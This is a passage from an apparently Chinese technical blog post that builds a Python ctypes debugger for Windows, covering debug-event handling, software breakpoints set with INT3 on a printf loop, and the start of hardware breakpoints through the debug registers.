rel="noopener">UNLOAD_DLL_DEBUG_INFO</a>结构。</td></tr></tbody></table><p>通过上面的事件代码，我们就可以获取被调试进程的运行过程、当前发生的事件信息，方便后续的调试工作。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">ContinueDebugEvent</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwProcessId,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwThreadId,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwContinueStatus</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p><code>ContinueDebugEvent()</code>函数使得被调试事件中断的线程继续运行，直到捕获下一个调试事件。</p><p>其中，<code>dwContinueStatus</code>参数指定了下一次调试事件发生时的报告选项。</p><table><thead><tr><th style="text-align:center">Value</th><th style="text-align:center">Meaning</th></tr></thead><tbody><tr><td style="text-align:center"><strong>DBG_CONTINUE</strong><br>0x00010002L</td><td style="text-align:center">如果<code>dwThreadId</code>参数指定的线程先前报告了<code>EXCEPTION_DEBUG_EVENT</code>调试事件，则该函数将停止所有异常处理并继续执行该线程，并将异常标记为已处理。对于任何其他调试事件，此标志仅继续执行线程。</td></tr><tr><td style="text-align:center"><strong>DBG_EXCEPTION_NOT_HANDLED</strong><br>0x80010001L</td><td style="text-align:center">如果<code>dwThreadId</code>指定的线程先前报告了<code>EXCEPTION_DEBUG_EVENT</code>调试事件，则该函数将继续异常处理。如果这是第一次命中异常事件，则使用结构化异常处理程序的搜索和调度逻辑；否则，该过程终止。对于任何其他调试事件，此标志仅继续执行线程。</td></tr><tr><td style="text-align:center"><strong>DBG_REPLY_LATER</strong><br>0x40010001L</td><td style="text-align:center">在Windows 10版本1507或更高版本中受支持，此标志使<code>dwThreadId</code>在目标继续后重播现有的Breaking事件。通过针对<code>dwThreadId</code>调用<a href="https://docs.microsoft.com/windows/desktop/api/processthreadsapi/nf-processthreadsapi-suspendthread" target="_blank" rel="noopener">SuspendThread</a> API ，调试器可以恢复进程中的其他线程，然后返回中断。</td></tr></tbody></table><p>下面是一个附加进程后打印调试事件的例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> my_debugger</span><br><span class="line"></span><br><span class="line">debugger = my_debugger.debugger()</span><br><span class="line">pid = input(<span class="string">"Enter the PID of the process to attach to:"</span>)</span><br><span class="line"></span><br><span class="line">debugger.attach(int(pid))<span class="comment"># attach the process</span></span><br><span class="line">debugger.run()</span><br><span class="line">debugger.detach()</span><br></pre></td></tr></table></figure><p>调用API的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        </span><br><span class="line">    <span class="comment"># Now we have to poll the debuggee for </span></span><br><span class="line">    <span class="comment"># debugging events           </span></span><br><span class="line">    <span class="keyword">while</span> self.debugger_active == <span class="literal">True</span>:</span><br><span class="line">        self.get_debug_event() </span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_debug_event</span><span class="params">(self)</span>:</span></span><br><span class="line">        </span><br><span class="line">    debug_event    = DEBUG_EVENT()</span><br><span class="line">    continue_status = DBG_CONTINUE</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> kernel32.WaitForDebugEvent(byref(debug_event),<span class="number">100</span>):</span><br><span class="line">        <span class="comment"># grab various information with regards to the current exception.</span></span><br><span class="line">        self.h_thread          = self.open_thread(debug_event.dwThreadId)</span><br><span class="line">        self.context           = self.get_thread_context(h_thread=self.h_thread)</span><br><span class="line">        self.debug_event       = debug_event</span><br><span class="line">        </span><br><span class="line">                   </span><br><span class="line">        print(<span class="string">"Event Code: %d Thread ID: %d"</span> % \</span><br><span class="line">            (debug_event.dwDebugEventCode,debug_event.dwThreadId))</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> debug_event.dwDebugEventCode == EXCEPTION_DEBUG_EVENT:</span><br><span class="line">            self.exception = debug_event.u.Exception.ExceptionRecord.ExceptionCode</span><br><span class="line">            self.exception_address = debug_event.u.Exception.ExceptionRecord.ExceptionAddress</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># call the internal handler for the exception event that just occured.</span></span><br><span class="line">            <span class="keyword">if</span> self.exception == EXCEPTION_ACCESS_VIOLATION:</span><br><span class="line">                print(<span class="string">"Access Violation Detected."</span>)</span><br><span class="line">            <span class="keyword">elif</span> self.exception == EXCEPTION_BREAKPOINT:</span><br><span class="line">                continue_status = self.exception_handler_breakpoint()</span><br><span class="line">            <span class="keyword">elif</span> self.exception == EXCEPTION_GUARD_PAGE:</span><br><span class="line">                print(<span class="string">"Guard Page Access Detected."</span>)</span><br><span class="line">            <span class="keyword">elif</span> self.exception == EXCEPTION_SINGLE_STEP:</span><br><span class="line">                self.exception_handler_single_step()</span><br><span class="line">            </span><br><span class="line">        kernel32.ContinueDebugEvent(debug_event.dwProcessId, debug_event.dwThreadId, continue_status)</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Enter the PID of the <span class="keyword">process</span> to attach to:<span class="number">18248</span></span><br><span class="line">Event Code: <span class="number">3</span> Thread ID: <span class="number">20692</span></span><br><span class="line">Event Code: <span class="number">6</span> Thread ID: <span class="number">20692</span></span><br><span class="line">Event Code: <span class="number">2</span> Thread ID: <span class="number">18492</span></span><br><span class="line">Event Code: <span class="number">2</span> Thread ID: <span class="number">22368</span></span><br><span class="line">Event Code: <span class="number">2</span> Thread ID: <span class="number">21472</span></span><br><span class="line">Event Code: <span class="number">6</span> Thread ID: <span class="number">20692</span></span><br><span class="line">Event Code: <span class="number">6</span> Thread ID: <span class="number">20692</span></span><br><span class="line">Event Code: <span class="number">6</span> Thread ID: <span class="number">20692</span></span><br><span class="line">Event Code: <span class="number">6</span> Thread ID: <span class="number">20692</span></span><br><span class="line">Event Code: <span class="number">6</span> Thread ID: <span class="number">20692</span></span><br><span class="line">Event Code: <span class="number">6</span> Thread ID: <span class="number">20692</span></span><br><span class="line">Event Code: <span class="number">6</span> Thread ID: <span class="number">20692</span></span><br><span class="line">Event Code: <span class="number">6</span> Thread ID: <span class="number">20692</span></span><br><span class="line">Event Code: <span class="number">6</span> Thread ID: <span class="number">20692</span></span><br><span class="line">Event Code: <span class="number">2</span> Thread ID: <span class="number">13260</span></span><br><span class="line">Event Code: <span class="number">1</span> Thread ID: <span class="number">13260</span></span><br><span class="line">[*] Inside the breakpoint handler.</span><br><span class="line">[*] Exception address: <span class="number">0</span>x77943f80</span><br><span class="line">Event Code: <span class="number">4</span> Thread ID: <span class="number">13260</span></span><br><span class="line">Event Code: <span class="number">4</span> Thread ID: <span class="number">18492</span></span><br><span class="line">Event Code: <span class="number">4</span> Thread ID: <span class="number">22368</span></span><br><span class="line">Event Code: <span class="number">4</span> Thread ID: <span class="number">21472</span></span><br></pre></td></tr></table></figure><p>值得注意的是其中的<code>EXCEPTION_DEBUG_EVENT (0x1)</code>例外事件，它由 windows 设置的断点所引发，允许在 进程启动前观察进程的状态。</p><p>最后的几个事件是<code>EXIT_THREAD_DEBUG_EVENT (0x4)</code>，它是当<code>detach()</code>函数被调用时，进程结束自身产生。</p><hr><h2 id="断点"><a class="header-anchor" href="#断点"></a>断点</h2><table><thead><tr><th style="text-align:center">断点类型</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">软件断点</td><td style="text-align:center">是用的最多的断点类型，软件断点的本质是利用一个单字节指令（<code>INT3 中断事件</code>），<br>用于暂停被调试的程序，然后将控制权转义给调试器的断点处理函数。<br>    软件断点会改变程序运行的内存数据，同时也改变了软件的<code>CRC</code>校验和。<br>因此当被调试软件会检验CRC校验和的时候，调试行为只能用硬件断点实现。</td></tr><tr><td style="text-align:center">硬件断点</td><td style="text-align:center">硬件断点是CPU级别的断点，用到了特定的寄存器：调试寄存器。<br>调试器被专门用于调试事件，一个CPU一般会有8个调试寄存器。硬件断点一般被用于：<br>1. 当特定的地址上有指令执行的时候中断<br>2. 当特定的地址上有数据可以写入的时候<br>3. 当特定的地址上有数据读或者写但不执行的时候</td></tr><tr><td style="text-align:center">内存断点</td><td style="text-align:center">内存断点通过改变内存页面的访问权限，然后通过跟踪被保护页的访问异常，<br>进一步确定程序对内存的访问行为，进而确认程序对数据的操作。<br>    内存断点可以监控内存中数据的变化。</td></tr></tbody></table><p><a href="https://www.kancloud.cn/wizardforcel/grey-hat-python/125757" target="_blank" rel="noopener">详细介绍在这里</a></p><p>以下分别对以上三种断点进行处理：</p><hr><h4 id="软件断点："><a class="header-anchor" href="#软件断点："></a>软件断点：</h4><p>需要用到两个函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">ReadProcessMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE  hProcess,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCVOID lpBaseAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPVOID  lpBuffer,</span></span></span><br><span class="line"><span class="function"><span class="params">  SIZE_T  nSize,</span></span></span><br><span class="line"><span class="function"><span class="params">  SIZE_T  *lpNumberOfBytesRead</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">WriteProcessMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE  hProcess,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPVOID  lpBaseAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCVOID lpBuffer,</span></span></span><br><span class="line"><span class="function"><span class="params">  SIZE_T  nSize,</span></span></span><br><span class="line"><span class="function"><span class="params">  SIZE_T  *lpNumberOfBytesWritten</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p>这两个函数可以读取或修改被调试进程的内存，参数定义如下：</p><p><code>hProcess</code>具有正在读取的内存的进程的句柄。句柄必须具有对进程的<code>PROCESS_VM_READ</code>访问权限。</p><p><code>lpBaseAddress</code>指向要从中读取的指定进程中的基地址的指针。在进行任何数据传输之前，系统会验证基址和指定大小的内存中的所有数据都可以访问以进行读取访问，如果无法访问，则该功能将失败。</p><p><code>lpBuffer</code>指向缓冲区的指针，该缓冲区从指定进程的地址空间接收内容。</p><p><code>nSize</code>从指定进程中读取的字节数。</p><p><code>lpNumberOfBytesRead</code>指向变量的指针，该变量接收传输到指定缓冲区的字节数。如果<code>lpNumberOfBytesRead</code>为<code>NULL</code>，则忽略该参数。</p><p>以下以调试<code>printf()</code>函数为例：</p><p>首先需要确定一个函数的虚地址，这里用到了<code>GetProcAddress()</code>这个API：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">FARPROC <span class="title">GetProcAddress</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HMODULE hModule,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR  lpProcName</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p>参数<code>hMoudle</code>为包函数或变量（待调试函数）的模块的句柄。</p><p>这个句柄可以通过<code>GetModuleHandle()</code>获取。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HMODULE <span class="title">GetModuleHandleA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR lpModuleName</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p><strong>这里有一个坑：</strong></p><p>MSDN官方文档中有这么一句话：</p><blockquote><p>检索指定模块的模块句柄。该模块必须已由调用进程加载。</p><p>为避免在“备注”部分中描述的竞争条件，请使用 <a href="https://docs.microsoft.com/windows/desktop/api/libloaderapi/nf-libloaderapi-getmodulehandleexa" target="_blank" rel="noopener">GetModuleHandleEx</a>函数。</p><p>返回的句柄不是全局的或可继承的。它不能被其他进程复制或使用。</p></blockquote><p>就是说待获取的模块必须是已经被进程加载的模块（好像是句废话233333），重点是后面，**返回的句柄不能被其余进程复制或使用。**即是说当前调试的句柄只在当前有效。</p><p>ok，准备就绪，下面贴软件断点调试需要用到的调用代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 读取目标地址的数据</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_process_memory</span><span class="params">(self,address,length)</span>:</span></span><br><span class="line">        </span><br><span class="line">    data         = <span class="string">b""</span></span><br><span class="line">    read_buf     = create_string_buffer(length)</span><br><span class="line">    count        = c_ulong(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># kernel32.ReadProcessMemory(self.h_process, address, read_buf, 5, byref(count))</span></span><br><span class="line">    <span class="comment"># data    = read_buf.raw</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># return data</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> kernel32.ReadProcessMemory(self.h_process, address, read_buf, length, byref(count)):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        data += read_buf.raw</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 向对应地址写入数据    </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_process_memory</span><span class="params">(self,address,data)</span>:</span></span><br><span class="line">    </span><br><span class="line">    count  = c_ulong(<span class="number">0</span>)</span><br><span class="line">    length = len(data)</span><br><span class="line">    </span><br><span class="line">    c_data = c_char_p(data[count.value:])</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> kernel32.WriteProcessMemory(self.h_process, address, c_data, length, byref(count)):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置断点</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bp_set</span><span class="params">(self,address)</span>:</span></span><br><span class="line">    print(<span class="string">"[*] Setting breakpoint at: 0x%08x"</span> % address)</span><br><span class="line">    <span class="comment"># 原先的has_key()方法在python3中被移除了</span></span><br><span class="line">    <span class="comment">#首先判断该地址是否在断点列表中</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (address <span class="keyword">in</span> self.breakpoints):</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 读取并保存该断点地址的原数据</span></span><br><span class="line">        old_protect = c_ulong(<span class="number">0</span>)</span><br><span class="line">        kernel32.VirtualProtectEx(self.h_process, address, <span class="number">1</span>, PAGE_EXECUTE_READWRITE, byref(old_protect))</span><br><span class="line">        </span><br><span class="line">        original_byte = self.read_process_memory(address, <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> original_byte != <span class="literal">False</span>:</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># write the INT3 opcode</span></span><br><span class="line">            <span class="keyword">if</span> self.write_process_memory(address, <span class="string">b"\xCC"</span>):     <span class="comment"># 这里也是bytes</span></span><br><span class="line">                </span><br><span class="line">                <span class="comment"># register the breakpoint in our internal list</span></span><br><span class="line">                self.breakpoints[address] = (original_byte)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取函数在模块中的地址</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func_resolve</span><span class="params">(self,dll,function)</span>:</span></span><br><span class="line">        </span><br><span class="line">    handle  = kernel32.GetModuleHandleA(dll)</span><br><span class="line">    address = kernel32.GetProcAddress(handle, function)</span><br><span class="line">    </span><br><span class="line">    kernel32.CloseHandle(handle)</span><br><span class="line">    <span class="keyword">return</span> address</span><br></pre></td></tr></table></figure><p>软件断点调试<code>printf()</code>函数的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># my_test.py</span></span><br><span class="line"><span class="keyword">import</span> my_debugger</span><br><span class="line"></span><br><span class="line">debugger = my_debugger.debugger()</span><br><span class="line">pid = input(<span class="string">"Enter the PID of the process to attach to:"</span>)</span><br><span class="line">debugger.attach(int(pid))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里还是要使用bytes传参。</span></span><br><span class="line">printf_address = debugger.func_resolve(<span class="string">b"msvcrt.dll"</span>, <span class="string">b"printf"</span>)</span><br><span class="line">print(<span class="string">"[*] Address of printf: 0x%08x"</span> % printf_address)</span><br><span class="line"></span><br><span class="line">debugger.bp_set(printf_address)</span><br><span class="line"></span><br><span class="line">debugger.run()</span><br><span class="line"><span class="comment"># debugger.detach()</span></span><br><span class="line"><span class="comment"># input("")</span></span><br></pre></td></tr></table></figure><p>运行<code>printf_loop.py</code>，并查找到该进程的<code>PID</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># printf_loop.py</span></span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">msvcrt = cdll.msvcrt</span><br><span class="line">counter = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    msvcrt.printf(<span class="string">b"Loop iteration %d\n"</span> % counter)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    counter += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>软件断点调试的流程如下：</p><p>首先通过<code>func_resolve()</code>函数在<strong>被附加调试的进程的模块中</strong>找到<code>printf()</code>函数的虚拟地址，然后<code>bp_set()</code>函数下断点，<code>run()</code>函数监听调试事件。</p><p>下断点的过程如下：</p><p>首先读取目标地址的原数据并保存，然后向目标地址写入<code>INT3</code>断点指令，并等待调试事件发生即可。</p><p>命中断点之后，将之前保存的原数据写回，并将<code>EIP</code>寄存器值-1，使程序正常执行。</p><p>调试效果：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Enter the PID of the <span class="keyword">process</span> to attach to:<span class="number">2348</span></span><br><span class="line">[*] Address of printf: <span class="number">0</span>x765a4f70</span><br><span class="line">[*] Setting breakpoint at: <span class="number">0</span>x765a4f70</span><br><span class="line">Event Code: <span class="number">3</span> Thread ID: <span class="number">18548</span></span><br><span class="line">Event Code: <span class="number">6</span> Thread ID: <span class="number">18548</span></span><br><span class="line">Event Code: <span class="number">2</span> Thread ID: <span class="number">25680</span></span><br><span class="line">Event Code: <span class="number">2</span> Thread ID: <span class="number">2636</span></span><br><span class="line">Event Code: <span class="number">2</span> Thread ID: <span class="number">20208</span></span><br><span class="line">Event Code: <span class="number">6</span> Thread ID: <span class="number">18548</span></span><br><span class="line">Event Code: <span class="number">6</span> Thread ID: <span class="number">18548</span></span><br><span class="line">Event Code: <span class="number">2</span> Thread ID: <span class="number">7376</span></span><br><span class="line">Event Code: <span class="number">1</span> Thread ID: <span class="number">18548</span></span><br><span class="line">[*] Exception address: <span class="number">0</span>x765a4f70</span><br><span class="line">[*] Hit user defined breakpoint.</span><br><span class="line">Event Code: <span class="number">1</span> Thread ID: <span class="number">7376</span></span><br><span class="line">[*] Exception address: <span class="number">0</span>x77943f80</span><br><span class="line">[*] Hit the first breakpoint.</span><br><span class="line">Event Code: <span class="number">4</span> Thread ID: <span class="number">7376</span></span><br><span class="line">Event Code: <span class="number">4</span> Thread ID: <span class="number">20208</span></span><br></pre></td></tr></table></figure><hr><h3 id="硬件断点"><a class="header-anchor" href="#硬件断点"></a>硬件断点</h3><p>硬件断点使用专门的CPU调试寄存器实现，这里务必要记住的是：</p><p>当我们使用硬件断点的时候，要跟踪四个可用的调试寄存器哪个是可用的哪个已经被使用了。必须确保我们使用的那个寄存器是空的，否则硬件断点就不能在我们希望的地方触发。</p><p>硬件断点流程如下：</p><p>首先枚举进程中的所有线程，然后获取其CPU寄存器值，并定义调试寄存器<code>DR0</code>-<code>DR3</code>的值，写入断点地址，然后更新<code>DR7</code>标志位，开启硬件断点。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bp_set_hw</span><span class="params">(self, address, length, condition)</span>:</span></span><br><span class="line">        </span><br><span class="line">    <span class="comment"># Check for a valid length value</span></span><br><span class="line">    <span class="keyword">if</span> length <span class="keyword">not</span> <span class="keyword">in</span> (<span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        length -= <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">    <span class="comment"># Check for a valid condition</span></span><br><span class="line">    <span class="keyword">if</span> condition <span class="keyword">not</span> <span class="keyword">in</span> (HW_ACCESS, HW_EXECUTE, HW_WRITE):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Check for available slots</span></span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> <span class="keyword">not</span> <span class="keyword">in</span> self.hardware_breakpoints:</span><br><span class="line">        available = <span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="number">1</span> <span class="keyword">not</span> <span class="keyword">in</span> self.hardware_breakpoints:</span><br><span class="line">        available = <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="number">2</span> <span class="keyword">not</span> <span class="keyword">in</span> self.hardware_breakpoints:</span><br><span class="line">        available = <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="number">3</span> <span class="keyword">not</span> <span class="keyword">in</span> self.hardware_breakpoints:</span><br><span class="line">        available = <span class="number">3</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="comment"># We want to set the debug register in every thread</span></span><br><span class="line">    <span class="keyword">for</span> thread_id <span class="keyword">in</span> self.enumerate_threads():</span><br><span class="line">        context = self.get_thread_context(thread_id=thread_id)</span><br><span class="line">        <span class="comment"># Enable the appropriate flag in the DR7</span></span><br><span class="line">        <span class="comment"># register to set the breakpoint</span></span><br><span class="line">        context.Dr7 |= <span class="number">1</span> &lt;&lt; (available * <span class="number">2</span>)</span><br><span class="line">        <span class="comment"># Save the address of the breakpoint in 